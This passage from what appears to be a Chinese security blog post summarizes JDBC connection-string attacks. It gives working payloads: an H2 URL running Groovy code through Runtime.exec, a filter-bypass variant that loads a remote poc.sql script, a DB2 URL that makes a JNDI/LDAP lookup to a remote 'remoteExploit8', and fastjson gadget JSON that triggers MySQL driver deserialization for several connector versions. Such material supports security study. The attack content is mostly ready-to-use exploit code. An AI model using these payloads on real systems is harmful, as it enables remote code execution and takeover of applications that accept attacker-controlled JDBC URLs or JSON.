+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String groovy = <span class="string">&quot;@groovy.transform.ASTTest(value=&#123;&quot;</span> + <span class="string">&quot; assert java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;)&quot;</span> + <span class="string">&quot;&#125;)&quot;</span> + <span class="string">&quot;def x&quot;</span>;</span><br><span class="line">String url = <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS &#x27;&quot;</span>+ groovy +<span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="绕过检测-1"><a href="#绕过检测-1" class="headerlink" title="绕过检测"></a>绕过检测</h3><p>大小写绕过<br>添加/绕后关键字<br><code>jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;I\\NIT=R\\UNSCRIPT FROM &#39;http://127.0.0.1:50025/poc.sql&#39;</code><br>制表符和其他不可见字符代替空格</p>
+<h2 id="IBM-DB2"><a href="#IBM-DB2" class="headerlink" title="IBM DB2"></a>IBM DB2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">druidDataSource.setUrl(<span class="string">&quot;jdbc:db2://127.0.0.1:5001/BLUDB:clientRerouteServerListJNDIName=ldap://10.0.0.67:1389/remoteExploit8;&quot;</span>);</span><br><span class="line">druidDataSource.setDriverClassName(<span class="string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>从上述总结可以看出JDBC反序列化往往可以rce或者读写文件，除了在配置连接场景下的攻击，还可以通过反序列化触发数据库的连接<br>jdbc连接第一个触发的方法就是<strong>DriverManager#getConnection</strong>，而fastjson，common beanutil和pojonode等链子都能够触发getter方法，所以如果在反序列化时候有jdbc包就有可能触发jdbc攻击</p>
+<p>fastjson打mysql jdbc</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Mysql connector 5.1.11-5.1.48</span></span><br><span class="line">&#123;<span class="attr">&quot;name&quot;</span>: &#123;<span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>, <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>, <span class="attr">&quot;hostToConnectTo&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, <span class="attr">&quot;portToConnectTo&quot;</span>: <span class="number">3306</span>, <span class="attr">&quot;info&quot;</span>: &#123; <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;CommonsCollections5&quot;</span>, <span class="attr">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>, <span class="attr">&quot;statementInterceptors&quot;</span>: <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>, <span class="attr">&quot;autoDeserialize&quot;</span>: <span class="string">&quot;true&quot;</span>, <span class="attr">&quot;NUM_HOSTS&quot;</span>: <span class="string">&quot;1&quot;</span> &#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Mysql connector 6.0.2 or 6.0.3</span></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span>,<span class="attr">&quot;proxy&quot;</span>: &#123;<span class="attr">&quot;connectionString&quot;</span>:&#123;<span class="attr">&quot;url&quot;</span>:<span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=CommonsCollections5&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Mysql connector 8.0.19</span></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span>,<span class="attr">&quot;proxy&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span>,<span class="attr">&quot;connectionUrl&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span>, <span class="attr">&quot;masters&quot;</span>:[&#123;<span class="attr">&quot;host&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>&#125;], <span class="attr">&quot;slaves&quot;</span>:[],<span class="attr">&quot;properties&quot;</span>:&#123;<span class="attr">&quot;host&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>,<span class="attr">&quot;user&quot;</span>:<span class="string">&quot;CommonsCollections5&quot;</span>,<span class="attr">&quot;dbname&quot;</span>:<span class="string">&quot;dbname&quot;</span>,<span class="attr">&quot;password&quot;</span>:<span class="string">&quot;pass&quot;</span>,<span class="attr">&quot;queryInterceptors&quot;</span>:<span class="string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="attr">&quot;autoDeserialize&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其他 <code>https://github.com/luelueking/Deserial_Sink_With_JDBC</code></p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/JDBC/"># JDBC</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2026/07/08/misc/xml%20%E6%80%BB%E7%BB%93/">xml 总结</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
